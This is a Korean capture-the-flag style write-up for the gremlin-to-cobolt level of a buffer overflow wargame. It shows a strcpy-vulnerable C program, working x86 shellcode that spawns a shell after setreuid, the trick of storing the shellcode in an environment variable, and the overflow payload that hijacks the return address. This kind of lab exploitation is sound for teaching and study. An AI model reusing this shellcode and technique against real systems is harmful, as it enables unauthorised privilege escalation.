# gremlin -> cobolt

cobolt.c는 아래와 같다.
``` C
int main(int argc, char *argv[])
{
    char buffer[16];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
```
앞선 문제와 비슷하다고 생각하여 똑같은 방법으로 풀려 했으나 24byte인 쉘코드보다 작은 버퍼를 가지고 있어서 다른 방법을 고민해 보았다.
검색을 해 보니 환경변수를 이용하여 쉘을 획득할 수 있다고 하였다.
``` C
#include<stdio.h>

int main(void)
{
        printf("%p\n", getenv("shellcode"));
        return 0;
}
```
```
[gremlin@localhost gremlin]$ export shellcode=`python -c 'print "\x90"*100+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
```
위의 코드들을 통해 쉘코드를 환경변수에 등록하였다.
```
[gremlin@localhost gremlin]$ ./Address
0xbffffef7
```
쉽게 쉘 코드를 실행할 수 있는 주소를 획득할 수 있다.   
payload는 NOP * 20 + \xf7\xfe\xff\xbf 이다.
```
[gremlin@localhost gremlin]$ ./cobolt `python -c 'print "\x90"*20 + "\xf7\xfe\xff\xbf"'`
÷þÿ¿
bash$ my-pass
euid = 502
hacking exposed
```
